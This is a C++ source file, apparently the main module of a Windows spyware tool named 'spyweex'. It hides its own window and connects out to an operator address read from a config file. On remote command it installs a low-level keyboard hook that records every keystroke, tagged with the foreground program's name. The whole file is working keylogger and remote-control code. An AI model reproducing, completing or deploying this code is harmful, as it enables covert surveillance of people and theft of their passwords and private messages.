// spyweex.cpp : Defines the entry point for the application.
// //

#pragma once

#include "targetver.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <boost/asio.hpp>
#include <boost/thread.hpp>

#include <locale.h>
//#include <windows.h>

#include "spyweex.h"
#include "server.hpp"

#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <algorithm>
#include <iostream>
#include <fstream>
#include "utils.hpp"
#include "string_utils.h"

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
HWND hWnd;										// window handle, for SendMessage

Hardware keyboard(WH_KEYBOARD_LL);

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

#pragma region map<int, string> key-value correspondence
static std::map<int, std::wstring> cor =
{
	{ 8, L"[BACKSPACE]" },{ 13, L"\r\n" },{ 27, L"[ESC]" },
	{ 32, L" "},{ 33, L"[Page Up]" },{ 34, L"[Page Down]" },
	{ 35, L"[END]" },{ 36, L"[HOME]" },
	{ 37, L"[Arrow Left]" },{ 38, L"[Arrow Up]" },
	{ 39, L"[Arrow Right]" },{ 40, L"[Arrow Down]" },
	{ 45, L"[INSERT]" },{ 46, L"[DELETE]" },
	{ 91, L"[L Windows Key]" },{ 92, L"[R Windows Key]" },
	{ 93, L"[R Menu]" },{ 144, L"[NUM LOCK]" },
	{ 222, L"\'" }
};
#pragma endregion

http::server::server s;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	nCmdShow = 0;
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: Place code here.
	// Initialize global strings
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_SPYWEEX, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	std::ifstream cfgFile("C:\\Users\\weex9_000\\Source\\Repos\\spyweex-repo\\Debug\\cfgspx.txt", std::ifstream::in);
	std::string target_address;

	if(cfgFile.is_open())
	{
		cfgFile >> target_address;
		cfgFile.close();
	}
	std::vector<std::string> ip_port = http::server::string_utils::split(target_address, std::string(":"));
	std::string ip = ip_port[0];
	std::string port = ip_port[1];


	s.set_ip(ip);
	s.set_port(port);
	s.async_connect();

	//boost::thread t(boost::bind(&http::server::server::run, &s));
	boost::thread_group worker_threads;
	for (int i = 0; i < 5; i++)
		worker_threads.create_thread(boost::bind(&http::server::server::run, &s));

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SPYWEEX));
	MSG msg;

	// Main message loop:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	worker_threads.join_all();
	//t.join();
	return (int)msg.wParam;
}

//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SPYWEEX));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_SPYWEEX);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		//case WM_COMMAND:
		//    {
		//        int wmId = LOWORD(wParam);
		//        // Parse the menu selections:
		//        switch (wmId)
		//        {
		//        case IDM_ABOUT:
		//            DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
		//            break;
		//        case IDM_EXIT:
		//            DestroyWindow(hWnd);
		//            break;
		//        default:
		//            return DefWindowProc(hWnd, message, wParam, lParam);
		//        }
		//    }
		//    break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code that uses hdc here...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_START_KEYLOGGER:
	{
		keyboard.hook(keyboard_hook_proc);
	}
	break;
	case WM_STOP_KEYLOGGER:
	{
		keyboard.endWorking(http::server::utils::get_time());
		keyboard.unHook();
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

//HHOOK get_keyboard_hook_handler()
//{
//	return _handler;
//}

//bool hook_keyboard()
//{
//	if ((_handler = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook_proc, NULL, 0)) == NULL)
//		return false;
//	return true;
//}
//
//bool unhook_keyboard()
//{
//	return 	UnhookWindowsHookEx(_handler);
//}

LRESULT CALLBACK keyboard_hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code >= 0) {
		WCHAR buff[10];
		BYTE  KeyState[256];
		WCHAR lpString[256];
		WCHAR lpCurrWindowName[MAX_PATH];
		KBDLLHOOKSTRUCT *pKeyBoard;

		// we are setting bool value for working keyboard here, because of
		// we want to know the exact time of when the user prints the
		// first key after we have setted the hook, and not 
		// the time of setting hook.
		if (!keyboard.isWorking())
			keyboard.startWorking(http::server::utils::get_time());

		volatile HKL hkl = GetKeyboardLayout(get_foreground_window_threadId());	
		pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);		
		GetKeyboardState(KeyState);
		SHORT caps_lock = GetKeyState(VK_CAPITAL);
		SHORT shift = GetKeyState(VK_SHIFT);
		
		if (wParam == WM_KEYDOWN) {
			if(get_foreground_window_name(lpCurrWindowName))
			{
				if(wcscmp(keyboard.getLastActiveWindow().c_str(), lpCurrWindowName) != 0)
				{
					keyboard.setActiveWindow(std::wstring(lpCurrWindowName));
					keyboard.log(L"\r\n[Active Window(TITLE): " + 
						std::wstring(lpCurrWindowName).erase(0, wstring(lpCurrWindowName).find_last_of('\\')) + L"]\r\n");
				}
			}
			if (cor.count(pKeyBoard->vkCode))
				keyboard.log(cor[pKeyBoard->vkCode]);
			else
				if (
					ToUnicodeEx(
						pKeyBoard->vkCode,
						MapVirtualKey(pKeyBoard->vkCode, 0),
						/*pKeyBoard->scanCode,*/
						KeyState, buff, _countof(buff),
						0,
						hkl) >= 1)
				{
					if (shift >> 15 & 1 || caps_lock & 1)
						keyboard.log(_wcsupr(buff));
					else
						keyboard.log(buff);
				}

			else 				
				if (GetKeyNameTextW(MAKELONG(0, MapVirtualKey(pKeyBoard->vkCode, 0)), lpString, 255) > 0)
				keyboard.log(L"[" + std::wstring(lpString) + L"]");
		}
	}

	return (CallNextHookEx(keyboard.getHandler(), code, wParam, lParam));
}

Hardware& get_keyboard_hardware_instance()
{
	return keyboard;
}

HWND& get_window_hWnd()
{
	return hWnd;
}

DWORD get_foreground_window_threadId()
{
	GUITHREADINFO gti;
	ZeroMemory(&gti, sizeof(GUITHREADINFO));
	gti.cbSize = sizeof(GUITHREADINFO);
	GetGUIThreadInfo(0, &gti);
	DWORD dwThread = GetWindowThreadProcessId(gti.hwndFocus, 0);
	return dwThread;
}

BOOL get_foreground_window_name(__out LPWSTR lpCurrWindowName)
{
	HWND fg;
	DWORD pid;
	HANDLE hProcess;
	DWORD cchLen = MAX_PATH;
	
	if ((fg = GetForegroundWindow())) {
		GetWindowThreadProcessId(fg, &pid);
		if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid))) {
			if (QueryFullProcessImageNameW(hProcess, 0, lpCurrWindowName, &cchLen)) {					
				CloseHandle(hProcess);
				return true;
			}
			CloseHandle(hProcess);
		}
	}
	return false;
}

//bool stockProcessName()
//{
//	HWND fg;
//	DWORD pid;
//	HANDLE hProcess;
//	DWORD cchLen = MAX_PATH;
//
//	if ((fg = GetForegroundWindow())) {
//		GetWindowThreadProcessId(fg, &pid);
//		if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid))) {
//			if (QueryFullProcessImageNameA(hProcess, 0, newPath, &cchLen)) {
//				if (strcmp(newPath, curPath) != 0) {
//					strcpy_s(curPath, newPath);
//					json.putActiveProcess(curPath, "USELESS");
//				}
//				CloseHandle(hProcess);
//				return true;
//			}
//			CloseHandle(hProcess);
//		}
//	}
//	return false;
//}